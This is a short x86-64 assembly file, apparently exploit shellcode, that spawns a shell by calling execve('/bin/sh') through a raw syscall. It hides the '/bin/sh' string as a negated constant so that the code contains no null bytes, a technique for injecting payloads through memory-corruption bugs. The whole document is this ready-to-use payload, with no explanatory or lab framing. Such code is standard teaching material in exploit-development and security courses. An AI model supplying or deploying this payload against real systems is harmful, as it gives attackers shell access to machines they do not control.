[BITS 64]

start:
	; RDI = path = "/bin/sh"
	mov rbx, 0xFF978CD091969DD1
	neg rbx
	push rbx
	mov rdi, rsp
	
	; RSI = argv = {"/bin/sh", NULL}
	xor rax, rax
	push rax
	push rdi
	mov rsi, rsp
	
	; RDX = envp = NULL
	xor rdx, rdx
	
	; Call execve()
	mov al, 0x3b
	syscall
	
	; Infinite loop
	jmp $
